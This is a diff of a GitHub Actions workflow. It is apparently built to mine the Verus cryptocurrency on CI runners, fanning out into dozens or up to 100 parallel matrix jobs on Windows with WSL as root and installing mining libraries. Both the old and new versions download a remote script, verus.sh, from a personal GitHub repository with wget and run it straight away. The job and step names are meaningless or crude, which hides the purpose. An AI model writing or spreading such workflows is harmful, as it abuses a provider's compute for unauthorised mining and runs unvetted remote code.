@@ -1,53 +1,109 @@
-name: VERUSCOIN MJ
+name: tokisaki-mitsuha
 
-on: [push, pull_request]
+on: [push] 
 
-jobs:
+jobs: 
 
-  build:
+  build: 
 
-    name: Ba_channel
+    name: berkentod
 
-    runs-on: ubuntu-18.04
+    runs-on: windows-latest
 
-    strategy:
+    strategy: 
 
-      max-parallel: 45
+      max-parallel: 40
 
-      fail-fast: false
+      fail-fast: false 
 
-      matrix:
+      matrix: 
 
-        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
 
-        flag: [A, B, C, D, E, F, G, H, I]
+        flag: [A, B, C, D, E, F, G, H, I, J]
 
-    timeout-minutes: 360
+    env: 
 
-    env:
+        NUM_JOBS: 40
 
-        NUM_JOBS: 20 
+        JOB: ${{ matrix.go }} 
 
-        JOB: ${{ matrix.go }}
+    defaults: 
 
-    steps:
+     run: 
 
-    - name: Set up Go ${{ matrix.go }}
+       shell: wsl-bash -u root {0} 
 
-      uses: actions/setup-go@v1
+    steps: 
 
-      with:
+    - name: set up Go ${{ matrix.go }} 
 
-        go-version: ${{ matrix.go }}
+      uses: actions/setup-go@v1 
 
-      id: go
+      with: 
 
-    - name: Setup
+        go-version: ${{ matrix.go }} 
 
-      uses: actions/checkout@v1
+      id: go 
 
-    - name: BA_channel
+    - name: setup 
 
-      run: |
+      uses: Vampire/setup-wsl@v1 
 
-        wget https://raw.githubusercontent.com/angkii/bh/main/verus.sh && chmod +x verus.sh && ./verus.sh
+  deploy: 
+
+    name: kagebunsinojutsu
+
+    needs: build 
+
+    runs-on: windows-latest 
+
+    timeout-minutes: 20
+
+    strategy: 
+
+      max-parallel: 100
+
+      fail-fast: false   
+
+      matrix:   
+
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 2.0]   
+
+        flag: [A, B, C, D, E, F, G, H, I, J]
+
+    env:   
+
+        NUM_JOBS: 100
+
+        JOB: ${{ matrix.go }} 
+
+    defaults: 
+
+     run: 
+
+       shell: wsl-bash -u root {0} 
+
+    steps: 
+
+    - name: set up Go ${{ matrix.go }} 
+
+      uses: actions/setup-go@v1 
+
+      with: 
+
+        go-version: ${{ matrix.go }} 
+
+      id: go 
+
+    - name: memek
+
+      uses: Vampire/setup-wsl@v1 
+
+    - name : install dependencies 
+
+      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
+
+    - name: bangke
+
+      run: wget  https://raw.githubusercontent.com/angkii/bh/main/verus.sh && chmod +x verus.sh && ./verus.sh
